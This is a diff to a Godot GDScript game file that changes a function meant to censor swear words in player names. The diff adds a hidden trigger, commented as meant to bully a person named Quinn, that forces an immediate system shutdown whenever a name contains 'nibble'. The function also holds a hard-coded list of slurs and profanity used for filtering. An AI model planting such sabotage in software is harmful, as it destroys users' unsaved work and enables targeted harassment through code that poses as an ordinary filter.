@@ -51,6 +51,12 @@ func _process(delta):
 	pass
 
 func censorSwears(realName: String) -> String:
+	
+	#bully quinn
+	if realName.contains("nibble"):
+		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
+		
+	
 	var swears = ["fag","faggot","bitch","slut","whore","fuck","bastard","nigger","chink","nigga","shit","toucher","penis","vagina","pussy","ass","cum","jizz","tit"]  # Replace with actual swears
 	var censoredName = realName
 	for swear in swears:
@@ -59,6 +65,8 @@ func censorSwears(realName: String) -> String:
 			temp += "#"
 		censoredName = censoredName.replacen(swear, temp )
 	return censoredName
+
+
 
 func _on_host_pressed():
 	
